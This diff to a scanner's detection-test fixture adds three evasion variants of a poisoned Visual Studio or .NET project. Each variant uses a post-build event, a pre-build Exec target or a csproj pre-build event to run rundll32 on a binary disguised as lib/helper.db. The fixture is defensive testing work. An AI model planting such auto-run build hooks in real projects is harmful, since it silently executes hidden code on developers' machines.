@@ -31,3 +31,44 @@ must_fire:
   - {rule: RC-BIN-001, path: lib/helper.db}
   - {rule: RC-AUTO-070, path: Exploit.vcxproj}
 must_not_fire: [RC-DLX-002]
+
+variants:
+  - id: post-build-event
+    technique: The command runs as a PostBuildEvent instead of a PreBuildEvent.
+    files:
+      Exploit.vcxproj: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <Project DefaultTargets="Build" ToolsVersion="16.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+          <ItemDefinitionGroup>
+            <PostBuildEvent>
+              <Command>rundll32.exe "$(ProjectDir)lib\helper.db",Start</Command>
+            </PostBuildEvent>
+          </ItemDefinitionGroup>
+          <ItemGroup>
+            <ClCompile Include="main.cpp" />
+          </ItemGroup>
+        </Project>
+  - id: exec-target
+    technique: A custom target with an Exec task before the build instead of a build event.
+    files:
+      Exploit.vcxproj: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <Project DefaultTargets="Build" ToolsVersion="16.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+          <Target Name="Prepare" BeforeTargets="Build">
+            <Exec Command="rundll32.exe &quot;$(ProjectDir)lib\helper.db&quot;,Start" />
+          </Target>
+          <ItemGroup>
+            <ClCompile Include="main.cpp" />
+          </ItemGroup>
+        </Project>
+  - id: csproj
+    technique: The same build event in a C# project file.
+    files:
+      Exploit.vcxproj: null
+      Exploit.csproj: |
+        <Project Sdk="Microsoft.NET.Sdk">
+          <PropertyGroup>
+            <OutputType>Exe</OutputType>
+            <PreBuildEvent>rundll32.exe "$(ProjectDir)lib\helper.db",Start</PreBuildEvent>
+          </PropertyGroup>
+        </Project>
